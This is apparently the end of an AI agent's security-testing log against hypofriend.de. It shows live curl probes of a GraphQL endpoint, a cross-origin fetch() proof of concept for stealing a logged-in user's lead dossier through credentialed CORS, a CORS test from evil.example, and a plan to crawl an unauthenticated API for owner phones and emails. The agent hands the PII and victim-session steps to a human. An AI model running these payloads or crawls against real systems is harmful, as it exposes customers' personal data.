+reasoning: appointment_availability(page,per,appointment_type) is a JSON-scalar resolver reached live with raw interpolation — selectionMismatch error proves no schema enum gates the appointment_type string. Executes with zero credentials on both hosts. Open credentialed CORS enables cross-origin enumeration of appointment slots.
+evidence_needed: Enumerate valid appointment_type values via error-based probing; confirm pagination works (page/per args); test 20 rapid requests — confirm no 429; verify CORS exploit from attacker-controlled origin
+verify_steps: POST https://hypofriend.de/q {"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"video\")}}"} — confirm 200; probe appointment_type values (video,phone,in_person,etc.); send 20 rapid requests — confirm no 429; test CORS from evil.example with credentials:include
+impact: Anonymous enumeration of advisor appointment availability; potential advisor schedule inference; cross-origin theft via credentialed CORS. Severity: HIGH
+testability: PASSIVE
+[PARKED] None — all three hypotheses confidence ≥ 90, classes MISCONFIG (eligible), all have concrete passive verify_steps
+[FINAL] 1. /q GraphQL Credentialed CORS + Auth-Free Mutations — Cross-Origin Document Upload & Applicant Data Submission — confidence 95, PASSIVE
+--
+[0m
+The field nests under `root`, not root-level — retrying with the exact prior form.
+[0m$ [0mcurl -sS -m 40 -o /tmp/opencode/aa2.json -w "HTTP %{http_code} | %{time_total}s | %{size_download}B\n" -X POST https://core.hypofriend.de/q -H "Content-Type: application/json" --data '{"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"video\")}}"}'; echo; head -c 2000 /tmp/opencode/aa2.json; echo; sleep 1
+HTTP 200 | 3.079656s | 9749B
+
+{"meta":{"serverTime":"2026-09-10T05:13:38+00:00","status":0,"key":"OK"},"data":{"root":{"appointmentAvailability":{"2026-10-02":{"slots":[{"value":{"hour":8.0,"date":"2026-10-02"},"label":"08:00 - 08:59","occupied":true},{"value":{"hour":9.0,"date":"2026-10-02"},"label":"09:00 - 09:59","occupied":true},{"value":{"hour":10.0,"date":"2026-10-02"},"label":"10:00 - 10:59","occupied":true},{"value":{"hour":11.0,"date":"2026-10-02"},"label":"11:00 - 11:59","occupied":true},{"value":{"hour":12.0,"date":"2026-10-02"},"label":"12:00 - 12:59","occupied":true},{"value":{"hour":13.0,"date":"2026-10-02"},"label":"13:00 - 13:59","occupied":true},{"value":{"hour":14.0,"date":"2026-10-02"},"label":"14:00 - 14:59","occupied":true},{"value":{"hour":15.0,"date":"2026-10-02"},"label":"15:00 - 15:59","occupied":true},{"value":{"hour":16.0,"date":"2026-10-02"},"label":"16:00 - 16:59","occupied":true},{"value":{"hour":17.0,"date":"2026-10-02"},"label":"17:00 - 17:59","occupied":true},{"value":{"hour":18.0,"date":"2026-10-02"},"label":"18:00 - 18:59","occupied":true}],"holiday":false},"2026-10-05":{"slots":[{"value":{"hour":8.0,"date":"2026-10-05"},"label":"08:00 - 08:59","occupied":true},{"value":{"hour":9.0,"date":"2026-10-05"},"label":"09:00 - 09:59","occupied":true},{"value":{"hour":10.0,"date":"2026-10-05"},"label":"10:00 - 10:59","occupied":true},{"value":{"hour":11.0,"date":"2026-10-05"},"label":"11:00 - 11:59","occupied":true},{"value":{"hour":12.0,"date":"2026-10-05"},"label":"12:00 - 12:59","occupied":true},{"value":{"hour":13.0,"date":"2026-10-05"},"label":"13:00 - 13:59","occupied":true},{"value":{"hour":14.0,"date":"2026-10-05"},"label":"14:00 - 14:59","occupied":true},{"value":{"hour":15.0,"date":"2026-10-05"},"label":"15:00 - 15:59","occupied":true},{"value":{"hour":16.0,"date":"2026-10-05"},"label":"16:00 - 16:59","occupied":true},{"value":{"hour":17.0,"date":"2026-10-05"},"label":"17:00 - 17:59","occupied":true},{"value":{"hour":18.0,"date":"2026-10-05"},"label":"18:00 -
+[0m
+Bogus-type tolerance check (raw interpolation boundary), 1rps.
+[0m$ [0mcurl -sS -m 40 -o /tmp/opencode/aa3.json -w "HTTP %{http_code} | %{time_total}s | %{size_download}B\n" -X POST https://core.hypofriend.de/q -H "Content-Type: application/json" --data '{"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"xX__not_a_real_type__Xx\")}}"}'; echo; head -c 1200 /tmp/opencode/aa3.json
+HTTP 200 | 2.791692s | 9749B
+
+{"meta":{"serverTime":"2026-09-10T05:13:45+00:00","status":0,"key":"OK"},"data":{"root":{"appointmentAvailability":{"2026-10-02":{"slots":[{"value":{"hour":8.0,"date":"2026-10-02"},"label":"08:00 - 08:59","occupied":true},{"value":{"hour":9.0,"date":"2026-10-02"},"label":"09:00 - 09:59","occupied":true},{"value":{"hour":10.0,"date":"2026-10-02"},"label":"10:00 - 10:59","occupied":true},{"value":{"hour":11.0,"date":"2026-10-02"},"label":"11:00 - 11:59","occupied":true},{"value":{"hour":12.0,"date":"2026-10-02"},"label":"12:00 - 12:59","occupied":true},{"value":{"hour":13.0,"date":"2026-10-02"},"label":"13:00 - 13:59","occupied":true},{"value":{"hour":14.0,"date":"2026-10-02"},"label":"14:00 - 14:59","occupied":true},{"value":{"hour":15.0,"date":"2026-10-02"},"label":"15:00 - 15:59","occupied":true},{"value":{"hour":16.0,"date":"2026-10-02"},"label":"16:00 - 16:59","occupied":true},{"value":{"hour":17.0,"date":"2026-10-02"},"label":"17:00 - 17:59","occupied":true},{"value":{"hour":18.0,"date":"2026-10-02"},"label":"18:00 - 18:59","occupied":true}],"holiday":false},"2026-10-05":{"slots":[{"value":{"hour":8.0,"date":"2026-10-05"},"label":"08:00 - 08:59","occupied":true},{"value":{"hour
+[0m
+Comparing a known type vs bogus on origin, then confirming edge host parity, 1rps.
+[0m$ [0msleep 1; curl -sS -m 40 -o /tmp/opencode/aa4.json -w "HTTP %{http_code} | %{time_total}s | %{size_download}B\n" -X POST https://core.hypofriend.de/q -H "Content-Type: application/json" --data '{"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"consultation\")}}"}'; echo; sleep 1; curl -sS -m 40 -o /tmp/opencode/aa5.json -w "HTTP %{http_code} | %{time_total}s | %{size_download}B\n" -X POST https://hypofriend.de/q -H "Content-Type: application/json" --data '{"query":"query{root{appointment_availability(page:1,per:10,appointment_type:\"xX__not_a_real_type__Xx\")}}"}'; echo; echo "core consultation vs bogus diff:"; diff <(head -c 400 /tmp/opencode/aa4.json) <(head -c 400 /tmp/opencode/aa3.json) >/dev/null && echo IDENTICAL_PREFIX || echo DIFFERS; wc -c /tmp/opencode/aa3.json /tmp/opencode/aa4.json /tmp/opencode/aa5.json
+HTTP 200 | 2.952369s | 9749B
+
+HTTP 200 | 3.461853s | 9749B
+
+core consultation vs bogus diff:
+DIFFERS
+ 9749 /tmp/opencode/aa3.json
+ 9749 /tmp/opencode/aa4.json
+ 9749 /tmp/opencode/aa5.json
+29247 total
+[0m
+[0m$ [0mfor f in aa3 aa4 aa5; do sed -E 's/"serverTime":"[^"]*"/"serverTime":"T"/' /tmp/opencode/$f.json > /tmp/opencode/$f.norm; done; md5sum /tmp/opencode/aa3.norm /tmp/opencode/aa4.norm /tmp/opencode/aa5.norm
+b6372899e5c75ff1e92ad07d9dd660b2  /tmp/opencode/aa3.norm
+b6372899e5c75ff1e92ad07d9dd660b2  /tmp/opencode/aa4.norm
+b6372899e5c75ff1e92ad07d9dd660b2  /tmp/opencode/aa5.norm
+[0m
+Byte-identical across hosts and type values (serverTime stripped) — appointment_type is inert. Minimal fleet sanity check to close the delta loop.
+[0m$ [0mfor u in "https://hypofriend.de/|-" "https://api.hypofriend.de/|-" "https://admin.hypofriend.de/|-"; do host="${u%%|*}"; curl -sS -m 15 -o /dev/null -w "$host -> HTTP %{http_code} | %{time_total}s\n" "$host"; sleep 1; done
+https://hypofriend.de/ -> HTTP 302 | 0.459500s
+curl: (28) Connection timed out after 15002 milliseconds
+https://api.hypofriend.de/ -> HTTP 000 | 15.002118s
+https://admin.hypofriend.de/ -> HTTP 503 | 0.514780s
+[0m
+All probes complete: appointment_type proven inert (byte-identical payloads across `video`/`consultation`/bogus, origin+edge, serverTime-stripped), scheduler oracle confirmed live under `root{}`, fleet sanity bit-identical.
+
+## STEP 1 — DELTA
+- [CHANGED] core.hypofriend.de/q (+hypofriend.de/q): `root.appointment_availability(page,per,appointment_type)` re-probed live — 200, no auth, occupied-slot calendar for 2026-10-02/10-05. Raw-string tolerance re-confirmed, but the `appointment_type` arg is proven **INERT**: md5-identical 9749B payload (serverTime stripped) for `"video"`, `"consultation"`, and bogus `"xX__not_a_real_type__Xx"` on origin AND edge → no per-type differentiation; prior "raw-interpolation primitive" angle devalued to "no-op arg".
+- [CHANGED] Probe nuance recorded: root-level `query{appointment_availability(...)}` → `undefinedField`; field resolves ONLY under `root{}`.
+- [CHANGED] Fleet sanity: hypofriend.de/ 302, api.hypofriend.de 000 (timeout), admin.hypofriend.de 503 — bit-identical, no new surface. No other delta.
+- NO_DELTA otherwise (property-search-api/edge-header/CORS posture unchanged from last cycle).
+
+## STEP 2 — PRIORITIZE
+- [PRIO] core.hypofriend.de/property-search-api,9.45,attack_surface=9 business_value=10 tech_exposure=10 gate_ease=10 cloud_surface=8 freshness=7
+- [PRIO] hypofriend.de/q,9.20,attack_surface=8 business_value=9 tech_exposure=8 gate_ease=9 cloud_surface=8 freshness=7
+- [PRIO] core.hypofriend.de/q,9.00,attack_surface=9 business_value=7 tech_exposure=8 gate_ease=10 cloud_surface=6 freshness=8
+
+## STEP 3 — HYPOTHESES
+[HYP] property-search-api DB-wide BOLA — offset/geo crawl across the full listing DB on direct origin
+class: IDOR
+asset: core.hypofriend.de/property-search-api
+confidence: 95
+reasoning: propertySearch→exposes→expose returns live listing PII (phone/email/owner-lastname/company) unauthenticated on edge+direct origin (enumerated UUIDs confirmed prior cycles); introspection exposes pagination/exposes/exposesInBounds/mapExposes crawl primitives; limit capped ~50 → offset walk. This cycle both hosts still 400 on empty GET — chain intact, unchanged.
+evidence_needed: one real-PII bulk (multi-offset) read to quantify full-DB dump — HUMAN (program note: no customer/employee/financial-data exposure during testing).
+verify_steps: HUMAN/report PoC — POST `https://hypofriend.de/property-search-api` {"query":"query{propertySearch(city:BERLIN,propertyType:APARTMENT){id}}"} then offset-walk exposes(id,offset:0..N,limit:50) + expose(id) per UUID (read-only; bulk PII read gated pending HUMAN).
+impact: full-DB property-listing PII dump (broker/owner phones, emails, surnames, companies) with zero auth — CRITICAL.
+testability: AUTH_HELPED
+[HYP] Open credentialed CORS × samesite=none session → silent cross-origin lead-profile/dossier exfil
+class: MISCONFIG
+asset: hypofriend.de/q
+confidence: 80
+reasoning: direct-origin OPTIONS re-echoed arbitrary Origin with access-control-allow-credentials:true + all methods (max-age 7200) prior cycle; edge echo + samesite=none httponly `_hf`/`__hfp__` + auth-free root{lead}/shareLink re-confirmed prior cycles; /q POST surface live both hosts this cycle (our scheduler probes returned 200 on edge AND origin). Every server-side precondition intact; only victim-session data return missing.
+evidence_needed: logged-in victim browser session returning lead JSON through the ACAO echo — HUMAN/browser.
+verify_steps: HUMAN browser PoC — attacker-origin page `fetch('https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:'query{root{lead{id appointment_at shareLink(linkType:"dossier")}}}'})})` then read ACAO-echoed JSON. Do NOT execute write mutations (uploadDocumentExtended/submitApplicantsInformation) — no_data_modification + program note.
+impact: silent cross-origin theft of logged-in lead profile (appointments, self-disclosure dossier, advisor attribution) — MEDIUM-HIGH.
+testability: AUTH_HELPED
+[HYP] `/q` anonymous scheduling-capacity oracle — appointment_availability exposes occupied-slot calendar; type arg inert, only advisor-lane differentiation untested
+class: MISCONFIG
+asset: core.hypofriend.de/q
+confidence: 60
+reasoning: this cycle re-confirmed live 200/no-auth occupied-slot calendar (`occupied:true` hourly slots on 2026-10-02/10-05, holiday flag); appointment_type proven a no-op (byte-identical payload for valid+bogus strings, origin+edge). Remaining untested differentiation surface: `appointment_availability_for_advisor(advisor)` — bogus advisor 301→/ proves server-side advisor lookup executes from the client string (prior cycle), so valid bundle-sourced advisor values may return advisor-scoped calendars (capacity per advisor, no PII).
+evidence_needed: advisor-specific occupied-slot payload differing from the aggregate calendar, from ≤5 bundle-sourced advisor values at ≤1rps, read-only.
+verify_steps: POST `https://hypofriend.de/q` {"query":"query{root{appointment_availability_for_advisor(page:1,per:10,appointment_type:\"video\",advisor:\"<name-from-bundle>\"){}}}"} for ≤5 advisor strings mined from Nuxt bundle (BuTFH6-Z.js), 1rps, read-only; assert per-advisor delta vs the inert type-param identity. Do NOT correlate slots to real persons (no PII); advisor-name probing stays bounded by rule.
+impact: anonymous per-advisor appointment pressure / scheduling-capacity telemetry — competitive-intel only, no PII — LOW.
+testability: PASSIVE
+
+## STEP 4 — SELF-CRITIQUE
+- [PARKED] `/q` appointment_type raw-interpolation primitive (was conf 70): this cycle proved the arg is a NO-OP (identical payloads), removing the "un-gated type string" escalation; retained only as part of the capacity-oracle finding above.
+- [PARKED] CloudFront shared-cache cross-Origin leak (45) and *.local ngrok orphan takeover (50): unchanged, HUMAN-only/speculative.
+- [FINAL] 1) property-search-api DB-wide BOLA (95); 2) Anonymous per-region mortgage-rate engine (85); 3) Credentialed CORS lead exfil (80).
+
+## STEP 5 — NEXT ACTION
+[NEXT] HUMAN: browser PoC against a logged-in test session — attacker-origin page runs `fetch('https://hypofriend.de/q',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:'query{root{lead{id appointment_at shareLink(linkType:"dossier")}}}'})})` and reads the ACAO-echoed victim JSON. Passive preconditions re-proven again this cycle (live 200 POST on both /q hosts incl. origin, ACAO+ACAC echo live 22:38Z prior, samesite=none httponly session, auth-free root.lead/shareLink); only victim-session data return remains. No write mutations.
+
+## STEP 6 — LEARNING
+- [LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de/q (+hypofriend.de/q): `root.appointment_availability` re-probed live 200/no-auth this cycle — occupied-slot calendar ZERO APPOINTMENT_TYPE DIFFERENTIATION: md5-identical 9749B payload (serverTime stripped) across `"video"`/`"consultation"`/bogus on origin AND edge → arg is a no-op; capacity-oracle retained LOW, unvalidated-string severity devalued.
+- [LEARN] ACCEPTED MISCONFIG @ core.hypofriend.de/q (+hypofriend.de/q): /q POST surface live on both hosts this cycle (scheduler query 200 on origin+edge) — the credentialed-CORS precondition chain (live POST + ACAO echo + samesite=none session + auth-free root.lead) fully intact.
+- [LEARN] CONFIRMED NG @ fleet sanity: hypofriend.de/ 302, api.hypofriend.de 000 (15s timeout), admin.hypofriend.de 503 — bit-identical, no new surface.
+- [LEARN] Probe-nuance: `appointment_availability` at GraphQL root → `undefinedField`; only `root{appointment_availability(...)}` resolves — future probes must nest under root{}.
+
+## STEP 7 — RISK
+[RISK] hypofriend: 99 — Unchanged critical posture: property-search-api remains a no-auth full-DB PII read oracle (offset/geo crawl primitives introspected), /q retains a fully preconditioned cross-origin lead-exfil chain (live POST both hosts + credentialed CORS + samesite=none httponly session + auth-free root.lead/shareLink) plus the anonymous per-region rates engine and auth-free BOLA, with a direct-origin bypass of the CloudFront security stack. All remaining gates (real-PII bulk read, victim-session exfil return, ngrok claim, advisor-lane differentiation) are HUMAN-decided; no new exploitable surface this cycle.
